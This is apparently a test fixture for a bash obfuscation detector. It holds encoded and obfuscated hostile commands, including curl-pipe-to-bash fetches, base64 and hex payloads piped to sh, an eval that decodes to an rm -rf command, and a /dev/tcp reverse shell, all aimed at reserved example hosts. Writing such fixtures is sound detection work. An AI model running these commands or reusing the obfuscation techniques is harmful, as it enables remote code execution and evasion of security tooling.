#!/bin/bash
# bash-obfuscation-suite.sh — fixture for bash-obfuscation.js coverage.
#
# A multi-branch sample exercising all six finder branches plus the
# /dev/tcp reverse-shell standalone. The shape is realistic — actual
# malicious samples interleave branches the same way — but the URLs /
# IPs are RFC-2606 / TEST-NET reserved values to keep the fixture
# safe to commit.

# B1: Variable expansion + line-level fragment join → 'curl -sSL https://malicious.example.test/install.sh | bash'
PAYLOAD='curl -sSL https://malicious.example.test/install.sh | bash'
${PAYLOAD:0:4} ${PAYLOAD:5:48} | bash

# B2: ANSI-C $'\xNN' quoting → 'curl evil.test'
alias x=$'\x63\x75\x72\x6c'
$'\x65\x76\x69\x6c\x2e\x74\x65\x73\x74'

# B3: printf '\xNN' chain → 'sh' (canonical 2-char shell-launch atom)
printf '\x73\x68'

# B4: base64-pipe-to-shell with literal payload
echo "Y3VybCAtZnNTTCBodHRwOi8vYWRyaWFuLmV4YW1wbGUudGVzdC9pbnN0YWxsLnNoIHwgYmFzaA==" | base64 -d | sh

# B4: live-fetch pipe-to-shell (detection-only — upstream is dynamic)
curl -fsSL https://198.51.100.5/install.sh | bash

# B4: xxd-r here-string → 'sh'
xxd -r -p <<< "7368" | sh

# B5: eval $(echo … | base64 -d)  →  'rm -rf /tmp/x'
eval $(echo "cm0gLXJmIC90bXAveA==" | base64 -d)

# B5: bash -c "$(printf '\xNN…')"  →  'curl'
bash -c "$(printf '\x63\x75\x72\x6c')"

# B6: IFS reassembly + eval $cmd
IFS='_'
cmd=ls_-la_/etc
eval $cmd

# B6: variable concatenation $a$b$c
a=cu
b=rl
c=' '
d='https://malicious.example.test/x'
$a$b$c$d

# /dev/tcp reverse-shell — Bash_DevTcp_Reverse_Shell YARA rule fires here.
bash -i >& /dev/tcp/192.0.2.1/4444 0>&1
